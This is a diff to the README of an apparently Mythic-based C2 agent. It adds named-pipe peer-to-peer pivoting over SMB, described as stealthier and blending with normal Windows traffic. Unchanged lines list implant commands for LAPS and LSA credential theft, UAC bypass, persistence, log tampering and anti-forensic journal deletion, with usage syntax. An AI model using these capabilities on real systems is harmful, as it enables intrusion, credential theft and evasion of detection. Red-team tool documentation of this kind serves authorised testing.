@@ -118,7 +118,7 @@ kill | `kill -pid <PID>` | Terminate a process by PID. Cross-platform (Windows/L
 laps | `laps -server <DC> -username <user@domain> -password <pass> [-filter <computer>]` | Read LAPS passwords from AD via LDAP. Supports LAPS v1 (ms-Mcs-AdmPwd) and Windows LAPS v2 (ms-LAPS-Password). Cross-platform (T1552.006).
 lsa-secrets | `lsa-secrets -action <dump\|cached>` | **(Windows only)** Extract LSA secrets (service passwords, DPAPI keys, machine account) and cached domain credentials (DCC2/MSCacheV2 hashcat format). Requires SYSTEM (T1003.004, T1003.005).
 launchagent | `launchagent -action <install\|remove\|list> -label <com.example.name> [-path <exe>] [-daemon true]` | **(macOS only)** Install, remove, or list LaunchAgent/LaunchDaemon persistence. Creates plist with RunAtLoad+KeepAlive.
-link | `link -host <ip> -port <port>` | Link to a TCP P2P agent for internal pivoting. Target agent must be built with TCP profile. Cross-platform (T1572).
+link | `link -host <ip> -port <port> [-connection_type tcp\|namedpipe] [-pipe_name <name>]` | Link to a P2P agent via TCP or named pipe for internal pivoting. Named pipe mode uses SMB port 445 for stealthier Windows traffic. Cross-platform TCP, Windows-only named pipe (T1572).
 ln | `ln -target <existing> -link <new> [-symbolic true] [-force true]` | Create symbolic or hard links. Symlinks can point to non-existent paths. Force mode replaces existing link. Cross-platform (T1036).
 linux-logs | `linux-logs -action <list\|read\|logins\|clear\|truncate\|shred> [-file <path>] [-search <filter>] [-lines <n>]` | **(Linux only)** List, read, clear, or tamper with Linux log files and binary login records (wtmp/btmp/utmp). Supports selective line removal and secure shredding (T1070.002).
 logonsessions | `logonsessions [-action list\|users] [-filter <name>]` | **(Windows, Linux, macOS)** Enumerate active logon sessions — users, session IDs, stations, connection state. Filter by username. Windows: WTS API. Linux: utmp parsing. macOS: utmpx parsing.
@@ -215,7 +215,7 @@ tscon | `tscon [-action <list\|hijack\|disconnect\|logoff>] [-session_id <id>]` 
 ts | `ts [-a] [-i PID]` | **(Windows only)** List threads in processes. By default shows only alertable threads (Suspended/DelayExecution). Use -a for all threads, -i to filter by PID (T1057).
 uac-bypass | `uac-bypass [-technique fodhelper\|computerdefaults\|sdclt\|eventvwr\|silentcleanup\|cmstp\|dismhost\|wusa] [-command <path>]` | **(Windows only)** Bypass UAC to escalate from medium to high integrity. 8 techniques: registry hijack, env var hijack, INF file abuse, COM CLSID hijack, mock trusted directory. Default spawns elevated callback (T1548.002, T1218.003).
 uniq | `uniq -path <file> [-count true] [-duplicate true] [-unique_only true]` | Filter or count duplicate consecutive lines in a file. Count mode sorts by frequency. Cross-platform (T1083).
-unlink | `unlink -connection_id <uuid>` | Disconnect a linked TCP P2P agent. Cross-platform (T1572).
+unlink | `unlink -connection_id <uuid>` | Disconnect a linked P2P agent (TCP or named pipe). Cross-platform (T1572).
 uptime | `uptime` | Show system uptime, boot time, and load averages. Cross-platform (T1082).
 upload | `upload` | Upload a file to the target with chunked file transfer.
 usn-jrnl | `usn-jrnl -action query\|recent\|delete [-volume C:]` | **(Windows only)** Query or delete NTFS USN Change Journal — destroys file operation history for anti-forensics (T1070.004).
@@ -550,7 +550,7 @@ The HTTP profile calls back to the Mythic server over the basic, non-dynamic pro
 
 ### TCP P2P Profile
 
-The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. A TCP child agent listens on a port and waits for a parent agent to connect via the `link` command. All tasking and responses are routed through the parent's egress channel (HTTP), so the child never contacts Mythic directly.
+The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. A child agent listens on a TCP port or Windows named pipe and waits for a parent agent to connect via the `link` command. All tasking and responses are routed through the parent's egress channel (HTTP), so the child never contacts Mythic directly.
 
 **Architecture:**
 
@@ -558,7 +558,8 @@ The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. 
 Mythic Server ←──HTTP──→ Egress Agent (HTTP profile)
                               │
                               ├──TCP──→ Child Agent A (TCP profile, port 7777)
-                              └──TCP──→ Child Agent B (TCP profile, port 8888)
+                              ├──TCP──→ Child Agent B (TCP profile, port 8888)
+                              └──SMB──→ Child Agent C (named pipe, \\host\pipe\msrpc-f9a1)
 ```
 
 **Build parameters:**
@@ -566,10 +567,11 @@ Mythic Server ←──HTTP──→ Egress Agent (HTTP profile)
 | Parameter | Description | Default |
 |-----------|-------------|---------|
 | `tcp_bind_address` | Address and port for the child to listen on (e.g., `0.0.0.0:7777`) | _(empty = HTTP mode)_ |
+| `namedpipe_bind_name` | Named pipe name for the child to listen on (e.g., `msrpc-f9a1`). Windows only. | _(empty)_ |
 
-When `tcp_bind_address` is set, the agent starts in TCP listener mode instead of HTTP egress mode. The TCP C2 profile parameters (port, AESPSK, killdate) configure the listener.
+When `tcp_bind_address` or `namedpipe_bind_name` is set, the agent starts in P2P listener mode instead of HTTP egress mode.
 
-**Usage workflow:**
+**Usage workflow (TCP):**
 
 1. Build a **child agent** with the TCP C2 profile and `tcp_bind_address` set (e.g., `0.0.0.0:7777`)
 2. Deploy the child to an internal host (no internet access required)
@@ -577,11 +579,21 @@ When `tcp_bind_address` is set, the agent starts in TCP listener mode instead of
 4. Mythic creates a new callback for the child — all tasking flows through the egress agent
 5. To disconnect: `unlink -connection_id <uuid>`
 
-**Encryption:** AES-256-CBC with HMAC-SHA256 (same as HTTP profile). Wire protocol uses 4-byte length-prefixed framing.
+**Usage workflow (Named Pipe):**
+
+1. Build a **child agent** with the TCP C2 profile and `namedpipe_bind_name` set (e.g., `msrpc-f9a1`)
+2. Deploy the child to an internal Windows host
+3. From an **egress agent**, run: `link -connection_type namedpipe -host <child_ip> -pipe_name msrpc-f9a1`
+4. The connection uses SMB (port 445), blending with normal Windows file sharing traffic
+5. To disconnect: `unlink -connection_id <uuid>`
+
+**Encryption:** AES-256-CBC with HMAC-SHA256 (same as HTTP profile). Wire protocol uses 4-byte length-prefixed framing over TCP or named pipe.
 
 **Relink support:** If a parent disconnects (e.g., via `unlink` or parent agent dies), the child agent caches its checkin data and waits for a new parent connection. When a new egress agent runs `link`, the child automatically re-registers with Mythic as a new callback. No manual intervention needed.
 
-**Multiple children:** An egress agent can link to multiple TCP children simultaneously. Each child operates independently with its own callback.
+**Multiple children:** An egress agent can link to multiple TCP and named pipe children simultaneously. Each child operates independently with its own callback.
+
+**OPSEC notes:** Named pipe connections use SMB (port 445) and generate fewer network-level indicators than raw TCP, but Sysmon Event ID 17/18 (PipeEvent) and ETW events from Microsoft-Windows-SMBClient will be logged if configured.
 
 ### Discord C2 Profile
 
